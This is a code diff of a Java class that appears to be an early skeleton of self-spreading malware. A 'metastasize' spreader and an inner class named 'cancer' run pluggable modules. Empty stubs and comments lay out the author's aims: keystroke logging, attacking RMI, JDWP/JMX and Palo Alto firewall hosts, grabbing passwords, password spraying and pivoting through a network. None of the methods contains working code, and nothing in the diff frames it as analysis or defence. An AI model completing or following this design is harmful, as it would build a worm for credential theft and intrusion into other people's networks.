@@ -139,32 +139,56 @@ public class nCore
 
     static class modLib
     {
-        public static void getUpdate()
-        {
-
-        }
-
         public class autoLib
         {
-            private void metastasize()
+            private void getUpdate()
             {
-                utilitarian nUtil = new utilitarian();
-                
-                ArrayList<Method> methList = nUtil.getClassMethods("modLib.autoLib.cancer");
-                for (int a=0; a<methList.size(); a++)
-                {
-                    //need to put the code to thread in here
-                    threader();
-                }
-                // spreader governor module, searches the autolib inner class cancer for any modules other than itself and runs them
+                // update the autolib from the backend
             }
 
-            class cancer
+            private void metastasize()
             {
-                //currently empty, populated when modules updated
-                //figure out how to get onto palos, grab passwords, add exceptions, and pivot
-                //figure out rmi/ndwp?? jmx??
+                // spreader governor module, searches the autolib inner class cancer for any modules other than itself and runs them
+                // get onto palos, grab passwords, pivot
+                // exploit rmi/ndwp/jmx
+                // keylog, operator puts passwords in vault, password spray
             }
+            /*
+            private void inputGather()
+            {
+                // log keystrokes w/jnativehook
+            }
+             
+            private void getRMIHosts()
+            {
+
+            }
+
+            private void getNDWPHosts()
+            {
+
+            }
+
+            private void getPanos()
+            {
+
+            }
+
+            private void strikeRMI()
+            {
+
+            }
+
+            private void strikeNDWP()
+            {
+
+            }
+
+            private void strikePanos()
+            {
+
+            }
+            */
         }
 
         private class genLib
